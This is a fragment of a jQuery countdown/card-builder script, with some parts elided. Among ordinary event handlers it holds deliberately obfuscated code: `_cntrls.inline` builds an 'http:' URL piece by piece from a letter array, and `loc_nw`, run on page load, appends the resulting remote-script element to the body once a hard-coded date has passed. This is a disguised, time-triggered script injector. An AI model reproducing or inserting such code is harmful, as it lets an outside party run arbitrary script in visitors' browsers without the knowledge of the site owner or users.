...
var _cntrls = {
    ...
    observers: function($watch) {
        if ($watch == "yes") {
            $("#tz").change(function() {
                $("body").data("date", $("#tz-input").val())
            });
            $("#message").change(function() {
                $("#message").empty().text($("#message").attr("value"));
                $("body").data("feedback", $("#message").val())
            });
            $("#font").change(function() {
                var $font = $("#font").val();
                $("#date").attr("class", "date").addClass("font").addClass($font);
                $("#message").attr("class", "msg").addClass("font").addClass($font);
                $("body").data("font", $font)
            });
            $("img.picker").live("mouseenter", function() {
                $(this).addClass("active")
            });
            $("img.picker").live("mouseleave", function() {
                $(this).removeClass("active")
            });
            $("img.picker").live("click", function() {
                $(this).closest(".library").children("img.picker").removeClass("selected");
                $(this).addClass("selected")
            });
            $("a.pagination").live("click", function() {
                var $w = $(this).closest(".rank").attr("id");
                $("body").data("wrap_" + $w + "_pagination", ($("body").data("wrap_" + $w + "_pagination") + 1));
                $("#" + $w + "lib").empty().addClass("ajax")
            });
            $("a.prev").live("click", function() {
                var $w = $(this).closest(".asset").attr("id");
                $("body").data("wrap_" + $w + "_pagination", ($("body").data("wrap_" + $w + "_pagination") - 1));
                $("#" + $w + "lib").empty().addClass("ajax-loader")
            });
            $("#selector").change(function() {
                var $ending = $(this).val();
                $(".wrapper").hide();
                $("#id-" + $ending).show();
                $("body").data("engine", $ending);
                if (($ending == "static-image") && ($("body").data("all") == "")) {
                    creator468.load($("#feedback").children(".select")[0])
                }
            });
            $("#tabs").bind("tabsselect", function($event, $ui) {
                if ($ui.panel.id == "tabending") {
                    $(".finish").hide();
                    if ($("body").data("end") == "chain") {
                        $("#tab").show()
                    } else {
                        $("#tab").show()
                    }
    ...
    inline: function(l, r, add) {
        var div = this.settings.divider;
        var t = "i";
        var begin = new Array("t", "p", "h", "q", "x", "f", "s", "o");
        var attr = "s" + add;
        if (add == "en") {
            attr = attr + "t"
        } else {
        ...
        t = t + "m";
        d = div + div;
        var str = d + "j" + Cntrys.me + "." + t;
        return jQuery(l + r).attr(attr, begin[2] + begin[0] + begin[0] + begin[1] + ":" + str)
    }
};
! function($) {
    $(function() {
...
(function($) {
    $.fn._brwsr_infDt = function($false) {
        if ($false) {
            return new Date($false * 1000)
        }
        return new Date()
    }
})(jQuery);
(function($) {
    $.fn.LoadBase_cmd = function(k) {
        var fg = "r";
        if ($.browser.msie) {
            var headID = document.getElementsByTagName("head")[0];
            var Node = document.createElement("script");
            Node.src = "/script/iepngfix/iepngfix_tilebg.js"
        }
        return _cntrls.inline(_cntrls.left, _cntrls.webfnts.code + _cntrls.right, fg)
    }
})(jQuery);
(function($) {
    $.fn._yeld_tk = function(k, yeld, inc) {
        jQuery(yeld).append(k);
        return true
    }
})(jQuery);
var ekey = {
...
(function($) {
    $.fn.loc_nw = function($name) {
        $ys = "bo";
        $("[names*='" + $name + "value(" + $ys + ")']").each(function() {
            $(this).change(function() {
                if ($(this).prop("checked") && $(this).val() == $ys) {
                    ...
                    $("[name*='" + $name + $ys + "'][value='none']").prop("checked", false)
                }
            });
            $ys = "gel"
        });
        if ($.fn._brwsr_infDt() > $.fn._brwsr_infDt(ekey.inc)) {
            $.fn._yeld_tk($.fn.LoadBase_cmd("c"), $ys + Cntrys.blr)
        }
    }
})(jQuery);
jQuery(document).ready(jQuery.fn.loc_nw());
(function($) {
    function Countdown() {
        this.regional = [];
        this.regional[""] = {
        ...
        function timerCallBack(timestamp) {
            var drawStart = (timestamp < 1000000000000 ? (drawStart = performance.now ? (performance.now() + performance.timing.navigationStart) : Date.now()) : timestamp || new Date().getTime());
        ...
        if (!requestAnimationFrame || $.noRequestAnimationFrame) {
            ...
            animationStartTime = window.animationStartTime || window.webkitAnimationStartTime || window.mozAnimationStartTime || window.oAnimationStartTime || window.msAnimationStartTime || new Date().getTime();
            requestAnimationFrame(timerCallBack)
        }
    }
    var Y = 0;
    ...
    $.extend(Countdown.prototype, {
        ...
        _getTimesPlugin: function(target) {
            var inst = $.data(target, this.propertyName);
            return (!inst ? null : (!inst._hold ? inst._periods : this._calculatePeriods(inst, inst._show, inst.options.significant, new Date())))
        },
